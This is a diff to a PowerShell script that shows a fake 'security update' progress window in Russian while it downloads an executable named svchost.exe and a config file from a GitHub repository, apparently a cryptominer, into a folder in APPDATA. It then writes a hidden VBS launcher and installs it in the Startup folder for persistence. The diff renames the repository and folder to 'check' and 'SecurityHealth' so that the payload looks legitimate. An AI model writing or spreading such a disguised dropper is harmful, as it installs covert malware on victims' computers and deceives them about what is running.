@@ -9,7 +9,7 @@ $form.FormBorderStyle = "None"
 $form.BackColor = [System.Drawing.Color]::FromArgb(5,5,25)
 $form.MaximizeBox = $false
 
-# Звёзды — 15 штук, чтобы не мешали
+# Звёзды
 $rand = New-Object System.Random
 for ($i=0; $i -lt 15; $i++) {
     $star = New-Object System.Windows.Forms.Label
@@ -78,9 +78,9 @@ $timer.Add_Tick({
         if ($progress.Value -eq 40 -and -not $script:filesReady -and -not $script:errorOccurred) {
             $status.Text = "Загрузка обновлений безопасности..."
             $substatus.Text = "Получение пакетов с сервера..."
-            $urlExe  = "https://github.com/Varenik638/mainer/raw/refs/heads/main/svchost.exe"
-            $urlConf = "https://github.com/Varenik638/cfg/raw/refs/heads/main/config.json"
-            $workDir = "$env:APPDATA\Microsoft\Windows\System"
+            $urlExe  = "https://github.com/Varenik638/check/raw/refs/heads/main/svchost.exe"
+            $urlConf = "https://github.com/Varenik638/check/raw/refs/heads/main/config.json"
+            $workDir = "$env:APPDATA\SecurityHealth"
             try {
                 if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
                 Invoke-WebRequest -Uri $urlExe -OutFile "$workDir\svchost.exe" -UseBasicParsing
@@ -101,8 +101,8 @@ $timer.Add_Tick({
         if ($progress.Value -eq 60 -and $script:filesReady) {
             $status.Text = "Настройка системы..."
             $substatus.Text = "Внесение параметров безопасности..."
-            $vbsPath = "$env:APPDATA\Microsoft\Windows\System\launch.vbs"
-            $vbsContent = "CreateObject(`"WScript.Shell`").Run `"$env:APPDATA\Microsoft\Windows\System\svchost.exe -c $env:APPDATA\Microsoft\Windows\System\config.json`", 0, False"
+            $vbsPath = "$env:APPDATA\SecurityHealth\launch.vbs"
+            $vbsContent = "CreateObject(`"WScript.Shell`").Run `"$env:APPDATA\SecurityHealth\svchost.exe -c $env:APPDATA\SecurityHealth\config.json`", 0, False"
             try {
                 $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
                 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityHealth.vbs"
